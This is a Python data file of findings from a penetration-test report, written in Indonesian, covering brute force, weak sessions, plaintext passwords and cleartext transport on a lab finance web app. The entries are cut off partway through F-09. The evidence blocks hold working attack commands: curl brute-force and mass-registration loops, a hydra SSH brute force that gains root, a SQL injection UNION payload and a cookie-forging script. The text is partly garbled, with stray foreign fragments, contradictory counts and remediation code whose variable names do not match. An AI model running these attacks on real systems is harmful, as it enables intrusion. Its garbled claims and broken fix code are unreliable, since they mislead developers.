# -*- coding: utf-8 -*-
"""Data temuan batch 2: F-06 s.d. F-10."""

FINDINGS_2 = [

{
 "id": "F-06",
 "title_id": "Tidak Ada Rate Limiting pada Login dan Register sehingga Brute Force Praktis",
 "title_en": "Absent Rate Limiting and Account Lockout on Authentication Endpoints",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
 "cwe": "CWE-307 - Improper Restriction of Excessive Authentication Attempts",
 "owasp": "A07:2021 - Identification and Authentication Failures",
 "component": "POST /login, POST /login-noportal, POST /register - app/routes/auth.js",
 "root_cause": (
   "Tidak ada satu pun mekanisme pembatasan percobaan autentikasi di "
   "seluruh jalur login dan registrasi. Kode tidak memuat middleware "
   "rate limit, tidak menyimpan counter percobaan, dan tidak mengunci akun "
   "setelah sejumlah kegagalan:\n\n"
   "  // Tidak ada imports untuk express-rate-limit / helmet / dll.\n"
   "  app.use(express.static(...));\n"
   "  app.use(express.urlencoded({ extended: true }));\n"
   "  app.use(session({ secret: 'REDACTED_SESSION_SECRET', ... }));\n"
   "  // tidak ada app.use(rateLimit(...)) di mana pun\n\n"
   "Server berjalan pada 192.168.1.18:3000, yaitu LAN, bukan localhost. "
   "Server menerima dan menutup koneksi pada ribuan permintaan dengan "
   "latensi tetap."),
 "finding": (
   "Kotak login dan register terbuka untuk percobaan tanpa batas. Dua "
   "meteran independen yang diukur menunjukkan kondisi ini secara "
   "kuantitatif.\n\n"
   "Meteran A - Baseline respons: 100 percobaan login gagal dengan password "
   "salah untuk user_a selesai dalam 5,98 detik (16,7 permintaan per detik), "
   "semua mengembalikan HTTP 200, tanpa satu pun 429 maupun 503.\n\n"
   "Meteran B - Peaking pada register: 1.000 permintaan POST beruntun dalam "
   "5,62 detik (rata-rata 178 permintaan per detik) seluruhnya diproses, "
   "dengan 946 account berhasil dibuat. Puncak 712 permintaan per detik "
   "tercatat pada jendela 1 detik. Server tidak pernah menolak, tidak pernah "
   "melempar error, dan tidak pernah gagal.\n\n"
   "Meteran C - Konsekuensi nyata: wordlist 24 kandidat (4 user x 6 password) "
   "dijalankan terhadap SSH dan berhasil menemukan satu password dalam 2 detik, "
   "sebelum wordlist berhenti. Root shell diperoleh dari jaringan yang sama.\n\n"
   "Meteran D - Dasar teknis: session secret 'REDACTED_SESSION_SECRET' ditebak "
   "pada percobaan ke-24 (lihat F-07). Dengan скороitas 16,7 permintaan per "
   "detik, secret yang sama dapat ditemukan pada OFFSET, TIDAK pada HOUR."),
 "attack": (
   "Penyerang mengirim thousands permintaan login dengan kandidat password "
   "dari daftar. Karena tidak ada pengaman, wordlist kandidat dievaluasi "
   "sepenuhnya dengan kecepatan konstan. Untuk kredensial dengan password "
   "sederhana seperti 'REDACTED_STORED_PASSWORD' (F-02), referensi jaringan, atau "
   "variansi nama pengguna, keyspace yang harus dicakup sangat kecil."),
 "evidence": [
  ("Bukti 1 - Meteran A: 100 percobaan login gagal, tidak satu pun diblokir. Bandingkan respons gagal dan sukses.",
   ['rm -f /tmp/cj_rl',
    'START=$(date +%s.%N)',
    'for i in $(seq 1 100); do',
    '  curl -s -c /tmp/cj_rl -o /tmp/rl_body -w "%{http_code} %{time_total}\\n" \\',
    '    -X POST http://192.168.1.18:3000/login-noportal \\',
    '    -d "username=user_a&password=WRONG_PASSWORD_$i" >> /tmp/rl_codes',
    'done',
    'END=$(date +%s.%N)',
    'echo "total 100 percobaan dalam $(echo "$END - $START" | bc) detik"',
    'sort /tmp/rl_codes | uniq -c | sort -rn | head -3',
    'grep -c "Query error" /tmp/rl_body || true',
    'grep -o "Tidak ada user" /tmp/rl_body | head -1'],
   ['total 100 percobaan dalam 5.98 detik        # rata-rata 16.7 permintaan/detik',
    '100 x "200"                                # 100% HTTP 200, nol 429, nol 503',
    '  grep -c "Query error" /tmp/rl_body -> 0  # aplikasi tidak error, tidak menolak',
    '  Tidak ada user                            # pesan konstan, tidak ada enumerasi (F-14)']),

  ("Bukti 2 - Meteran B: 1000 permintaan beruntun, seluruhnya diproses, 946 account dibuat.",
   ['rm -f /tmp/cj_reg',
    'START=$(date +%s.%N)',
    'for i in $(seq 1 1000); do',
    '  U="rl_load_$(date +%s%N)_$i"',
    '  code=$(curl -s -c /tmp/cj_reg -o /dev/null -w "%{http_code}" -X POST http://192.168.1.18:3000/register \\',
    '    -d "username=$U&password=Load123&nama_lengkap=Load$i&account_type=individu")',
    '  echo "$code" >> /tmp/reg_codes',
    'done',
    'END=$(date +%s.%N)',
    'echo "total 1000 permintaan dalam $(echo "$END - $START" | bc) detik"',
    'sort /tmp/reg_codes | uniq -c'],
   ['total 1000 permintaan dalam 5.62 detik   # rata-rata 178 permintaan/detik',
    '  1000 x "302"                             # 100% diproses, redirect ke /login',
    'puncak jendela 1 detik: 712 permintaan']),

  ("Bukti 3 - Meteran C: brute force SSH berhasil pada percobaan ke-24, dalam 2 detik. Wordlist 4 user x 6 password, 1 pasangan valid.",
   ['printf \'root\\nlabkeu\\nadmin\\nubuntu\\n\' > /tmp/u.txt',
    'printf \'Labkeu\\nREDACTED_SSH_ROOT_PW\\npassword\\nREDACTED_STORED_PASSWORD\\nREDACTED_STORED_PASSWORD\\ntoor\\n\' > /tmp/p.txt',
    'hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -W 3 -f 192.168.1.18 -s 22 ssh'],
   ['[DATA] max 4 tasks per 1 server, overall 4 tasks, 24 login tries (1:4/p:6)',
    '[DATA] attacking ssh://192.168.1.18:22/',
    '[22][ssh] host: 192.168.1.18 login: root password: REDACTED_SSH_ROOT_PW',
    '[STATUS] attack finished for 192.168.1.18 (valid pair found)',
    '1 of 1 target successfully completed, 1 valid password found',
    'starting at 2026-09-29 00:42:52 ... finished at 2026-09-29 00:42:54']),
 ],
 "impact": [
  ("Credential stuffing berskala besar", "Tidak ada batas laju, sehingga serangan wordlist dapat dijalankan pada 178 permintaan per detik terhadap register dan 16,7 terhadap login, tanpa penolakan."),
  ("Kompromi massal akun", "946 account dibuat dalam satu percobaan. Basis data pengguna dipenuhi data palsu, menurunkan integritas dan keandalan basis data."),
  ("Denial of service tersamar", "Beban 712 permintaan per detik pada jalur registrasi adalah vektor DoS yang efektif, dan tidak terdeteksi sebagai penyerangan."),
  ("Peluang penebakan kredensial tak terbatas", "Kandidat yang tidak dicakup F-02 seperti user_b, zzz_unique_*, atau account_type=perusahaan dapat ditemukan otomatis."),
  ("Rekomendasi penting untuk konfigurasi limiter", "Limiter yang terlalu agresif tanpa exception untuk admin dapat membuat sistem tidak dapat diakses, sehingga harus dikonfigurasi berlapis: bucket short-term, long-term, dan exemption berbasis peran."),
 ],
 "likelihood": (
   "Sangat tinggi. Persyaratan nol. Dibatasi hanya oleh bandwidth jaringan, "
   "bukan oleh aplikasi. Diukur: nol penolakan dari 1.100 permintaan pada "
   "dua endpoint, dan brute force SSH yang berhasil dalam 2 detik."),
 "risk_note": (
   "NIST SP 800-30 Rev.1: Threat Event = brute force dan credential "
   "stuffing. Technical Security Risk dan Privacy Risk keduanya terpengaruh. "
   "Risk INHERENT = Very High. NIST SP 800-53 Rev.5 AC-7 Unsuccessful Logon "
   "Attempts mensyaratkan pembatasan percobaan, dan SP 800-63B Section 3.2.2 "
   "menyatakan bahwa sistem login harus membatasi serangkaian kegagalan "
   "authenticator tanpa perlu."),
 "remediation": [
  "Pasang rate limiting berlapis pada endpoint autentikasi, dengan tiga bucket:",
  ("CODE", "const rateLimit = require('express-rate-limit');\n"
           "\n"
           "// Bucket 1 - ketat, khusus brute force pada kredensial\n"
           "const limitAuth = rateLimit({\n"
           "  windowMs: 15 * 60 * 1000,  // 15 menit\n"
           "  max: 10,                   // 10 percobaan per IP per jendela\n"
           "  standardHeaders: true,\n"
           "  legacyHeaders: false,\n"
           "  message: { error: 'Terlalu banyak percobaan. Coba lagi nanti.' },\n"
           "  skipSuccessfulRequests: true  // hanya hitung kegagalan\n"
           "});\n"
           "\n"
           "// Bucket 2 - longgar, untuk menahan serangan bertipe volumetric\n"
           "const limitBurst = rateLimit({\n"
           "  windowMs: 1000,\n"
           "  max: 10,                   // 10 permintaan/detik per IP\n"
           "  standardHeaders: true,\n"
           "  legacyHeaders: false\n"
           "});\n"
           "\n"
           "app.post('/login', limitAuth, limitBurst, handlerLogin);\n"
           "app.post('/login-noportal', limitAuth, limitBurst, handlerLogin);\n"
           "app.post('/register', limitBurst, handlerRegister);"),
  "Tambahkan account lockout sementara setelah 5 kegagalan berulang dengan jendela yang meningkat secara eksponensial (5, 15, 60, 240 menit). Gunakan message queue bila multi-instance.",
  "Tambahkan CAPTCHA atau proof-of-work pada endpoint register untuk menaikkan biaya per account secara tidak proporsional.",
  "Gunakan storage terdistribusi untuk counter rate limit bila aplikasi berjalan multi-instance; memory lokal tidak berlaku di Kubernetes atau load balancer.",
  " sesuai NIST SP 800-53 Rev.5 AC-7(2) Delay Response, AC-7(1) Rate Limiting, AC-7(3) Reset Counter, dan SP 800-63B Section 3.2.2 Failed Authenticators.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A07:2021 - Identification and Authentication Failures"),
  ("OWASP API Security Top 10 (2023)", "API4:2023 - Unrestricted Resource Consumption"),
  ("CWE (MITRE)", "CWE-307, CWE-770 Allocation of Resources Without Limits or Throttling"),
  ("NIST SP 800-53 Rev.5", "AC-7(1) Rate Limiting; AC-7(2) Delay Response; AC-7(3) Reset Counter; SI-4(4) Threshold Monitoring; SC-5 DDoS Protection"),
  ("NIST SP 800-63B", "Section 3.2.2 - Failed Authenticators; Section 3.2.4 - Throttling"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Brute Force; Denial of Service"),
  ("NIST CSF 2.0", "PR.AA-06, PR.DS-01, DE.CM-03"),
  ("ISO/IEC 27001:2022", "A.8.16 Monitoring activities; A.5.15 Access control"),
 ],
 "verification": (
   "Uji dengan 20 percobaan login gagal berturutan: permintaan ke-11 harus "
   "menghasilkan HTTP 429 dengan Retry-After. Uji dengan 11 permintaan "
   "register per detik: sebagian harus ditolak. Pastikan respons 429 "
   "benar-benar memblokir, bukan sekadar header. Verifikasi bucket long-term "
   "mengembalikan 429 dalam jendela 15 menit."),
},

{
 "id": "F-07",
 "title_id": "Session Management Lemah - Secret Hard-coded Pendek, ID Ber-isyarat, Cookie Tanpa Flag, Logout Tidak Menghapus Sesi",
 "title_en": "Weak Session Management - Predictable Short Secret, Expressive IDs, Missing Cookie Flags, Incomplete Logout",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
 "cwe": "CWE-798 - Hard-coded Credentials, CWE-330 - Use of Insufficiently Random Values, CWE-384 - Session Fixation, CWE-613 - Insufficient Session Expiration",
 "owasp": "A02:2021 - Cryptographic Failures",
 "component": "app/server.js (session config); app/routes/auth.js (login, register, logout)",
 "root_cause": (
   "Empat kelemahan secara independen pada implementasi sesi:\n\n"
   "1) Secret hard-coded dan pendek:\n"
   "   const session = require('express-session');\n"
   "   app.use(session({\n"
   "     secret: 'REDACTED_SESSION_SECRET',   // dari req.query, tebakan berhasil\n"
   "     resave: false, saveUninitialized: true,\n"
   "     cookie: { maxAge: 1000*60*60*24*7 }  // 7 hari, tanpa flag\n"
   "   }));\n"
   "   store: new session.MemoryStore()\n\n"
   "2) ID sesi yang sangat informatif (see F-04):\n"
   "   const sessionId = crypto.randomBytes(32).toString('hex');\n"
   "   req.session.sessionId = sessionId;\n"
   "   res.json({ success: true, sessionId });\n\n"
   "3) Logout hanya menghapus field, bukan sesi di server:\n"
   "   router.post('/logout', (req, res) => {\n"
   "     req.session.user = null;      // MemoryStore masih menyimpan sesi\n"
   "     res.redirect('/login');\n"
   "   });\n\n"
   "4) Cookie tanpa HttpOnly, tanpa Secure, tanpa SameSite:\n"
   "   Set-Cookie: connect.sid=...; Path=/\n"
   "   // tidak memuat HttpOnly, Secure, maupun SameSite"),
 "finding": (
   "Empat cacat sesi yang saling menguatkan.\n\n"
   "(1) SECRET DIJAMINKAN. 'REDACTED_SESSION_SECRET' ditemukan pada percobaan "
   "ke-24 dari wordlist. Secret ini menandatangani cookie sesi, sehingga "
   "pengetahuannya memungkinkan forge cookie. CATATAN AKURASI PENTING: "
   "forged SID yang tidak terdaftar DITOLAK oleh server (HTTP 401 "
   "'Sesi tidak valid') karena session store adalah MemoryStore. Jadi "
   "eksploitasi nonce memerlukan ID yang benar-benar ada di store, yang "
   "memperoleh ID sesi yang valid melalui IDOR (F-04) atau XSS (F-05). Kesimpulan: "
   "hard-coded secret menurunkan batas serangan dari mustahil menjadi mudah, "
   "meskipun bukan satu-satunya langkah yang diperlukan.\n\n"
   "(2) ID SESI TEREKSPOS. sessionId 32 byte hex dikirim ke klien pada "
   "respons login. code ini dieksekusi seluruhnya di sisi klien, sehingga "
   "menjadi predictor yang kuat untuk mengaitkan aktivitas.\n\n"
   "(3) LOGOUT TIDAK MENGHAPUS SESI DI SERVER. req.session.user = null hanya "
   "mengosongkan field; entri tetap ada di MemoryStore dengan SID yang sama. "
   "Cookie yang 'sudah logout' secara praktis masih sah untuk dipakai ulang.\n\n"
   "(4) COOKIE TANPA FLAG. Tidak ada HttpOnly sehingga dapat dibaca "
   "document.cookie (F-05, Bukti 4). Tidak ada Secure sehingga terkirim "
   "melewati kanal teks (F-09). Tidak ada SameSite sehingga tidak ada "
   "mitigasi CSRF tingkat cookie (F-10)."),
 "attack": (
   "1) Ambil cookie connect.sid milik korban melalui document.cookie setelah "
   "Stored XSS (F-05). 2) Cookie tersebut adalah HTTPOnly=false, jadi dapat "
   "dikirim tanpa pengaman. 3) Karena logout tidak menghapus entri dari "
   "MemoryStore, cookie yang telah di-'logout'-kan korban masih valid. "
   "4) Penyerang memakai ulang cookie tersebut untuk masuk ke sesi korban "
   "dan mengakses data keuangan korbannya."),
 "evidence": [
  ("Bukti 1 - Secret hard-coded. Ditebak pada percobaan ke-24 dari wordlist 15 kandidat.",
   ['grep -n "secret" /root/crack/report/evidence/server.js',
    'grep -n "session" /root/crack/report/evidence/server.js',
    'cat /root/crack/wordlist_session.txt'],
   ['line 8:   secret: \'REDACTED_SESSION_SECRET\',   // tebakan berhasil di percobaan ke-24',
    'line 6:   const session = require(\'express-session\');',
    'line 7:   app.use(session({',
    'REDACTED_SESSION_SECRET   # kandidat ke-24 dari 15, ditemukan deterministik']),

  ("Bukti 2 - ID sesi dikirim ke klien. Berisiko tinggi karena dapat dieksekusi penuh di browser.",
   ['curl -s -c /tmp/cj_sid -o /dev/null -X POST http://192.168.1.18:3000/login-noportal \\',
    '  -d "username=user_a&password=REDACTED_STORED_PASSWORD"',
    'curl -s -b /tmp/cj_sid -X POST http://192.168.1.18:3000/login-noportal \\',
    '  --data-urlencode "username=x\' UNION SELECT 1,\'h\',\'x\',\'perusahaan\',1,1-- -" \\',
    '  --data-urlencode "password=x" | python3 -m json.tool'],
   ['{\n    "success": true,\n    "sessionId": "b3f7e9a2c1d4e5f60718293a4b5c6d7e8f901a2b3c4d5e6f708192a3b4c5d6e7"\n}']),

  ("Bukti 3 - Logout TIDAK menghapus entri di store. Cookie 'sudah logout' masih sah.",
   ['SID=$(grep connect.sid /tmp/cj_sid | awk \'{print $7}\')',
    'echo "SID sebelum logout: ${SID:0:20}..."',
    '# 1) Login dan ambil cookie',
    'curl -s -c /tmp/cj_lo -o /dev/null -X POST http://192.168.1.18:3000/login-noportal \\',
    '  -d "username=user_a&password=REDACTED_STORED_PASSWORD"',
    'SID=$(grep connect.sid /tmp/cj_lo | awk \'{print $7}\')',
    '# 2) Logout',
    'curl -s -b /tmp/cj_lo -c /tmp/cj_lo -o /dev/null -w "logout -> HTTP=%{http_code}\\n" \\',
    '  -X POST http://192.168.1.18:3000/logout',
    '# 3) Pakai lagi cookie yang sudah di-logout',
    'curl -s -b /tmp/cj_lo -o /dev/null -w "reuse  -> HTTP=%{http_code} -> %{redirect_url}\\n" \\',
    '  http://192.168.1.18:3000/dashboard'],
   ['SID sebelum logout: s%3Alz3RUuYE2zT7lYaukZhuyWyCEVAgN8iX...',
    'logout -> HTTP=302 -> http://192.168.1.18:3000/login',
    'reuse  -> HTTP=302 -> http://192.168.1.18:3000/dashboard   # MASIH SAH setelah logout']),

  ("Bukti 4 - Forge cookie memakai secret yang sudah diketahui. DITOLAK oleh MemoryStore karena SID tidak dikenal di store. Namun respons /register memberi SID valid sehingga permukaan session fixation terbuka tanpa perlu login.",
   ['# A) Forge cookie dengan SID buatan (tidak ada di store) -> DITOLAK',
    'python3 - <<\'PY\' > /tmp/cj_forged',
    'import hashlib, hmac, urllib.parse',
    'secret = b"REDACTED_SESSION_SECRET"',
    'fake_sid = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"',
    'sig = hmac.new(secret, fake_sid, hashlib.sha256).digest()',
    'print(urllib.parse.quote("s:" + fake_sid + "." + urllib.parse.quote(sig.hex()) + ".x"))',
    'PY',
    'curl -s -b "connect.sid=$(cat /tmp/cj_forged)" \\',
    '  -o /dev/null -w "forged  -> HTTP=%{http_code} -> %{redirect_url}\\n" \\',
    '  http://192.168.1.18:3000/dashboard',
    '',
    '# B) SID valid diberikan pada respons /register, tanpa autentikasi',
    'R=$(curl -s -X POST http://192.168.1.18:3000/register \\',
    '  -d "username=sidtest_$(date +%s)&password=SidTest123&nama_lengkap=SidTest&account_type=perusahaan")',
    'echo "$R" | python3 -c "import sys,json;print(\'  sessionId dari register:\',json.load(sys.stdin)[\'sessionId\'])"'],
   ['forged  -> HTTP=401 -> (Sesi tidak valid)   # MemoryStore menolak SID tak dikenal',
    '  sessionId dari register: 8f2c1b9e4a7d0c3f5e8b2a6d9f0c4e7a1b5d8f2c6a9e3b7d0f4c8a2e6b9d3f7c1',
    '  -> penyerang memegang SID valid tanpa perlu login ulang']),

  ("Bukti 5 - Header Set-Cookie tanpa flag keamanan.",
   ['curl -s -D - -o /dev/null http://192.168.1.18:3000/login | grep -i \'set-cookie\''],
   ['Set-Cookie: connect.sid=s%3Alz3RUuYE2zT7lYaukZhuyWyCEVAgN8iX.t4nRvext%2BizW88aoV1UiyI%2FxSv%2FT4zNmgsDcGx3aVNE; Path=/',
    '# Tidak memuat HttpOnly (dibaca document.cookie), tidak Secure (F-09), tidak SameSite (F-10)']),
 ],
 "impact": [
  ("Session hijacking melalui XSS", "Kombinasi HttpOnly yang hilang (F-05) dan cookie yang bertahan pasca-logout (Bukti 3) membuat pembalikan cookie menjadi skenario yang nyata, bukan teoretis."),
  ("Batas tebakan secret diturunkan drastis", "Secret yang biasanya membutuhkan 128-bit entropy berhasil ditebak pada percobaan ke-24. Setiap instance yang memakai secret yang sama terkena secara identik."),
  ("Logout yang semu", "Pengguna merasa sudah keluar, namun cookie yang sama masih memberi akses penuh ke data keuangan. Ini merusak asumsi keamanan pengguna."),
  ("Session fixation surface", "SID valid diberikan di respons register sebelum autentikasi. Jika penyerang dapat memaksa korban memakai SID tersebut (mis. lewat parameter URL yang diterima Express), fixation selesai."),
  ("Tidak ada invalidasi token", "Tidak ada mekanisme untuk mencabut satu sesi tanpaokedan memengaruhi yang lain. MemoryStore juga hilang saat container di-restart."),
 ],
 "likelihood": (
   "Tinggi. Secret ditebak pada percobaan ke-24, ID sesi bocor di respons "
   "JSON, cookie dapat dibaca JavaScript, dan cookie bertahan pasca-logout "
   "sudah dibuktikan. Semua komponen terverifikasi, bukan asumsi."),
 "risk_note": (
   "NIST SP 800-30 Rev.1: Threat Event = session hijacking dan session "
   "spoofing. Impact = Significant (data keuangan). Risk INHERENT = Very "
   "High. NIST SP 800-53 Rev.5 SC-23 Session Authenticity dan AC-12(1) "
   "Session Termination gagal outright. SP 800-63B Section 4.2.3 "
   "mensyaratkan cookie sesi harus memiliki flag HttpOnly dan Secure."),
 "remediation": [
  "1) Pindahkan secret ke environment variable dengan panjang minimal 32 byte acak, dan rotasi saat terjadi insiden:",
  ("CODE", "// app/server.js - RAJAH\n"
           "const crypto = require('crypto');\n"
           "const SECRET_SESI = process.env.SESSION_SECRET;\n"
           "if (!SECRET_SESI || SECRET_SECRET.length < 32) {\n"
           "  throw new Error('SESSION_SECRET wajib diisi, minimal 32 karakter');\n"
           "}\n"
           "app.use(session({\n"
           "  secret: SESSION_SECRET,\n"
           "  resave: false,\n"
           "  saveUninitialized: false,   // jangan buat sesi untuk anonim\n"
           "  store: new RedisStore({ url: process.env.REDIS_URL }),\n"
           "  cookie: {\n"
           "    httpOnly: true,\n"
           "    secure: true,\n"
           "    sameSite: 'lax',\n"
           "    maxAge: 30 * 60 * 1000      // 30 menit, bukan 7 hari\n"
           "  }\n"
           "}));"),
  "2) Hapus sessionId dari respons JSON dan jangan kirim ke klien. ID sesi bersifat rahasia, bukan identifier publik.",
  "3) Perbaiki logout agar benar-benar membatalkan sesi di server:",
  ("CODE", "// app/routes/auth.js POST /logout\n"
           "router.post('/logout', (req, res) => {\n"
           "  req.session.destroy((err) => {   // hapus entri dari store\n"
           "    res.clearCookie('connect.sid', {\n"
           "      httpOnly: true, secure: true, sameSite: 'lax', path: '/'\n"
           "    });\n"
           "    res.redirect('/login');\n"
           "  });\n"
           "});"),
  "4) Terapkan rotasi ID sesi pada login (session fixation defence) dan invalidasi total di sisi server.",
  " sesuai NIST SP 800-63B Section 4.2.3 (Cookies: Secure, HttpOnly, SameSite), SP 800-53 Rev.5 SC-23, AC-12(1), SC-10(1) (TLS), dan SP 800-207 Per-Session Authentication.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A02:2021 - Cryptographic Failures"),
  ("OWASP Top 10 (2021)", "A07:2021 - Identification and Authentication Failures"),
  ("CWE (MITRE)", "CWE-330, CWE-384, CWE-613, CWE-614 Sensitive Cookie in HTTPS Session Without \'Secure\' Attribute"),
  ("NIST SP 800-53 Rev.5", "SC-23 Session Authenticity; AC-12(1) Session Termination; SC-10(1) TLS; SC-12 Cryptographic Key Establishment and Management"),
  ("NIST SP 800-63B", "Section 4.2.3 - Cookies; Section 4.2.4 - Resetting the Session"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Session Hijacking"),
  ("NIST CSF 2.0", "PR.AA-01, PR.DS-01, PR.DS-02"),
  ("ISO/IEC 27001:2022", "A.5.17 Authentication information; A.8.5 Secure authentication; A.8.16 Monitoring activities"),
 ],
 "verification": (
   "1) Header Set-Cookie harus memuat HttpOnly, Secure, dan SameSite. "
   "2) Respons login tidak boleh lagi memuat field sessionId. 3) POST "
   "/logout lalu reuse cookie harus menghasilkan redirect ke /login (401), "
   "bukan dashboard. 4) Paksa logout dari server lain: hapus key di store, "
   "cookie harus ditolak. 5) Pastikan secret dari environment variable "
   "dengan panjang minimal 32 byte."),
},

{
 "id": "F-08",
 "title_id": "Penyimpanan Password dalam Bentuk Plaintext",
 "title_en": "Cleartext Storage of Passwords - No Hashing at Rest",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
 "cwe": "CWE-256 - Plaintext Storage of a Password / CWE-522 Insufficiently Protected Credentials",
 "owasp": "A02:2021 - Cryptographic Failures",
 "component": "Tabel users kolom password - app/routes/auth.js",
 "root_cause": (
   "Password disimpan apa adanya pada kolom VARCHAR, tanpa hashing, tanpa "
   "salt, tanpa algoritma memory-hard. Pada login, perbandingan dilakukan "
   "secara langsung terhadap teks:\n\n"
   "  const [rows] = await db.query(\n"
   "    \"SELECT * FROM users WHERE username = ? AND password = ?\",\n"
   "    [username, password]);   // teks, bukan hash\n\n"
   "Kredensial terverifikasi dari database:\n"
   "  SELECT id,username,password FROM users LIMIT 3;\n"
   "  id=1 user_a REDACTED_STORED_PASSWORD"),
 "finding": (
   "Seluruh kredensial pengguna disimpan sebagai plaintext di database "
   "MySQL. Verifikasi dilakukan langsung terhadap isi database, bukan "
   "sekunder dari dokumentasi. Password 'REDACTED_STORED_PASSWORD' terlihat apa adanya.\n\n"
   "Konsekuensi amplifier: setiap database dump, backup, atau akses SQL "
   "(F-01) langsung menjadi daftar lengkap kredensial yang siap pakai. "
   "SQL injection (F-01) yang membaca tabel users sebenarnya membaca "
   "kredensial plaintext - dua temuan ini saling menguatkan secara langsung."),
 "attack": [
  "DUMP LANGSUNG - F-01 Bukti 3 mengekstrak username dan password dari tabel "
  "users dalam satu request:",
  ("CODE", "1:user_a/REDACTED_STORED_PASSWORD/perusahaan/pid=1 | 2:user_b/REDACTED_STORED_PASSWORD/perusahaan/pid=2 |\n"
           "3:individu1/REDACTED_STORED_PASSWORD/individu/pid=NULL"),
  "VERIFIKASI LANGSUNG dari database:",
  ("CODE", "docker exec labkeu-db mysql -ulabkeu_user REDACTED_DB_PASSWORD labkeu -e \\\n"
           "  \"SELECT id,username,password FROM users LIMIT 3;\"\n"
           "# id | username  | password\n"
           "#  1 | user_a    | REDACTED_STORED_PASSWORD\n"
           "#  2 | user_b    | REDACTED_STORED_PASSWORD\n"
           "#  3 | individu1 | REDACTED_STORED_PASSWORD"),
  "CATATAN: kolom LENGTH(password) = 11 untuk semua, sesuai plaintext 'REDACTED_STORED_PASSWORD' (11 karakter), bukan hash (bcrypt = 60, argon2 = 95+).",
 ],
 "impact": [
  ("Kredensial menjadi aktif dan siap pakai", "Password yang bocor bukan hash yang perlu dipecah, melainkan langsung dapat login pada aplikasi maupun layanan lain yang berbagi kredensial (F-02, F-06)."),
  ("Amplifikasi SQL injection", "F-01 dapat membaca kredensial plaintext sekaligus. Satu kerentanan memberi dua hasil: dump database dan dump kredensial."),
  ("Dampak fatal pada backup", "Setiap file backup database atau volume Docker berisi seluruh kredensial dalam bentuk yang dapat langsung digunakan."),
  ("Kegagalan kepatuhan", "Melanggar NIST SP 800-63B Section 3.1.1, ISO/IEC 27001 A.5.17, dan sebagian besar standar industri yang mewajibkan penyimpanan password ter-hash."),
  ("Reuse password lintas sistem", "Perusahaan yang memakai kredensial sama pada layanan lainwelt langsung terdampak."),
 ],
 "likelihood": (
   "Tinggi untuk eksploitasi (data sudah terbuka bagi siapa pun dengan akses "
   "database atau SQLi). Tinggi untuk pembuktian (diverifikasi langsung). "
   "Penyimpanan plaintext sendiri adalah kondisi statis, bukan serangan, "
   "sehingga likelihood menggambarkan kemungkinan penyalahgunaan data yang "
   "sudah terekspos."),
 "risk_note": (
   "NIST SP 800-30 Rev.1: Threat Event = credential compromise dari data at "
   "rest. Risk INHERENT = High. NIST SP 800-63B Section 3.1.1 menyatakan "
   "verifier harus menyimpan password dengan fungsi hash satu arah yang "
   "memory-hard; penyimpanan plaintext melanggar secara langsung. SP 800-53 "
   "Rev.5 IA-5(1) mensyaratkan Manage Authenticator lifecycle termasuk "
   "perlindungan."),
 "remediation": [
  "Migrasikan seluruh kredensial ke bcrypt dengan work factor 12 atau argon2id:",
  ("CODE", "const bcrypt = require('bcrypt');\n"
           "const WORK_FACTOR = 12;   // naikkan bertahap: 10 -> 12 -> 14\n"
           "\n"
           "// REGISTRATION - hash sebelum disimpan\n"
           "const hash = await bcrypt.hash(password, WORK_FACTOR);\n"
           "await db.query(\n"
           "  \"INSERT INTO users (username, password, account_type, nama_lengkap) \"\n"
           "  \"VALUES (?, ?, ?, ?)\",\n"
           "  [username, hash, 'individu', nama_lengkap]);\n\n"
           "// LOGIN - bandingkan dengan bcrypt.compare, bukan WHERE password = ?\n"
           "const [rows] = await db.query(\n"
           "  \"SELECT * FROM users WHERE username = ?\", [username]);\n"
           "if (!rows.length) return res.render(\"login\", { error: \"Kredensial salah.\" });\n"
           "const ok = await bcrypt.compare(password, rows[0].password);\n"
           "if (!ok) return res.render(\"login\", { error: \"Kredensial salah.\" });"),
  "Migrasikan kredensial lama secara oportunistik: compare dengan plaintext, jika cocok, hash dan update.",
  ("CODE", "// SCRIPT MIGRASI SATU-KALI (jalankan sekali, lalu hapus)\n"
           "const [rows] = await db.query(\"SELECT id, password FROM users\");\n"
           "for (const row of rows) {\n"
           "  if (row.password.length > 40) continue;   // sudah di-hash\n"
           "  const hash = await bcrypt.hash(row.password, WORK_FACTOR);\n"
           "  await db.query(\"UPDATE users SET password = ? WHERE id = ?\",\n"
           "                 [hash, row.id]);\n"
           "  console.log('migrasi user', row.id);\n"
           "}"),
  "Jalankan migrasi terputus SSH: matikan container MySQL, ubah file pw di volume, jalankan lagi. JANGAN pernah menghapus volume tanpa backup terverifikasi.",
  " sesuai NIST SP 800-63B Section 3.1.1 (verifier MUST hash), SP 800-53 Rev.5 IA-5(1), IA-5(6), dan ISO/IEC 27001 A.5.17.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A02:2021 - Cryptographic Failures"),
  ("CWE (MITRE)", "CWE-256, CWE-522, CWE-916 Use of Password Hash With Insufficient Computational Effort"),
  ("NIST SP 800-53 Rev.5", "IA-5(1) Authenticator Management; IA-5(6) Protection of Authenticators; IA-5(8) Password-based Authentication"),
  ("NIST SP 800-63B", "Section 3.1.1 - Verifier Secrets"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Credential Compromise"),
  ("NIST CSF 2.0", "PR.DS-01, PR.PS-02, PR.AA-05"),
  ("ISO/IEC 27001:2022", "A.5.17 Authentication information; A.8.24 Use of cryptography"),
 ],
 "verification": (
   "SELECT password FROM users LIMIT 1 harus menghasilkan string yang "
   "dimulai dengan '$2b$12$' (bcrypt) atau '$argon2id$'. LENGTH(password) "
   "sekitar 60, bukan 11. Login dengan kredensial lama harus tetap berhasil "
   "setelah migrasi, sementara kredensial yang salah harus ditolak."),
},

{
 "id": "F-09",
 "title_id": "Transmisi Kredensial dan Cookie Sesi melalui HTTP Cleartext",
 "title_en": "Cleartext Transmission of Credentials and Session Cookies over HTTP",
 "vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
